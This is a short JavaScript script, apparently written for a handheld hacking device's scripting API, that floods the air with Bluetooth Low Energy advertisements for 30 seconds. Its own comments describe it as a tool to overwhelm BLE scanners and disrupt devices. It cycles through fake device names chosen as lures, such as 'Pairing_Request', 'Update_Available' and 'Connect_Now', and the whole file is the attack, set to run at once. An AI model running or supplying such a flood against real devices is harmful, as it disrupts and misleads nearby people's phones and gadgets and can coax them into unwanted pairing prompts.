// BLE Spam / BLE Flood - Overwhelm BLE scanners
// Broadcasts junk BLE advertisements to disrupt devices

function bleSpam() {
    var advertisement_interval = 100; // ms between ads
    var spam_duration = 30000; // 30 seconds
    var packets_sent = 0;

    var device_names = [
        "Unknown_Device_1",
        "Pairing_Request",
        "Update_Available",
        "Connect_Now",
        "New_Device"
    ];

    var start_time = system.millis();
    var current_time = start_time;

    while ((current_time - start_time) < spam_duration) {
        for (var i = 0; i < device_names.length; i++) {
            // ble.advertise(name, interval)
            ble.advertise(device_names[i], advertisement_interval);
            packets_sent++;
        }
        current_time = system.millis();
    }

    return {
        action: "BLE Advertisement Spam",
        fake_devices: device_names.length,
        packets_sent: packets_sent,
        duration_seconds: 30,
        status: "Complete"
    };
}

// Run spam
bleSpam();
